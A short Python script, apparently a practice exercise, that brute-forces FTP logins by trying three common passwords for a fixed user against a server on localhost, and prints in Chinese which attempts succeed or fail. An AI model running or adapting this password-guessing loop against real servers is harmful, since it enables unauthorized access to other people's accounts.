from ftplib import FTP

def crack_ftp():
    Password=['123456','root','admin']
    user = 'hxh'
    for i in Password:
        ftp=FTP()
        ftp.set_debuglevel(0)
        ftp.connect('127.0.0.1',21)
        try:
            conn = ftp.login(user,i)
            ftp.close()
            if (conn):
                print("ftp连接成功，用户名是：{}    密码是：{}".format(user,i))
                ftp.close()
        except:
            print("ftp密码：{}错误！".format(i))
